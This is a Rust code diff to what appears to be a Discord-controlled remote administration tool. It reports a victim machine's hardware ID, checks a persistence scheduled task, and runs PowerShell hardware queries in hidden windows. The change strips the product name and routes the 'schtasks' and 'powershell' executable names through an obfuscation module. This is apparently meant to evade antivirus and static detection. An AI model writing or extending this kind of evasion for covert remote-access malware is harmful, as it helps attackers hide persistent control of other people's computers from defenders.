@@ -145,7 +145,7 @@ impl BotCommand for InfoCommand {
             ))
             .footer(EmbedFooter {
                 text: format!(
-                    "Kurinium v0.2.5 • HWID: {}",
+                    "v0.2.5 • HWID: {}",
                     device_info.hardware_id.chars().take(8).collect::<String>()
                 ),
                 icon_url: None,
@@ -162,6 +162,7 @@ impl BotCommand for InfoCommand {
 impl InfoCommand {
     fn check_startup_status() -> String {
         use crate::config::Config;
+        use crate::utils::obfuscate::exe;
         use std::os::windows::process::CommandExt;
         
         let startup_config = Config::get_startup_config();
@@ -173,7 +174,7 @@ impl InfoCommand {
         let task_name = startup_config.task_name;
         
         // try w /fo LIST format for better parsing
-        match Command::new("schtasks")
+        match Command::new(exe::schtasks())
             .args(["/query", "/tn", task_name, "/fo", "LIST"])
             .creation_flags(0x08000000)
             .output()
@@ -219,13 +220,12 @@ impl InfoCommand {
                 }
             }
 
-            if let Ok(output) = Command::new("powershell")
-                .args([
-                    "-Command",
-                    "Get-WmiObject -Class Win32_Processor | Select-Object Name | Format-List",
-                ])
-                .output()
-            {
+            if let Ok(output) = {
+                use crate::utils::obfuscate::{exe, powershell as ps};
+                Command::new(exe::powershell())
+                    .args([&ps::command(), "Get-WmiObject -Class Win32_Processor | Select-Object Name | Format-List"])
+                    .output()
+            } {
                 if output.status.success() {
                     let result = String::from_utf8_lossy(&output.stdout);
                     for line in result.lines() {
@@ -343,10 +343,12 @@ impl InfoCommand {
                 );
             }
 
-            if let Ok(output) = Command::new("powershell")
-                .args(["-Command", "Get-WmiObject -Class Win32_VideoController | Select-Object Name, AdapterRAM | Format-List"])
-                .output()
-            {
+            if let Ok(output) = {
+                use crate::utils::obfuscate::{exe, powershell as ps};
+                Command::new(exe::powershell())
+                    .args([&ps::command(), "Get-WmiObject -Class Win32_VideoController | Select-Object Name, AdapterRAM | Format-List"])
+                    .output()
+            } {
                 if output.status.success() {
                     let result = String::from_utf8_lossy(&output.stdout);
                     let mut gpu_names = Vec::new();
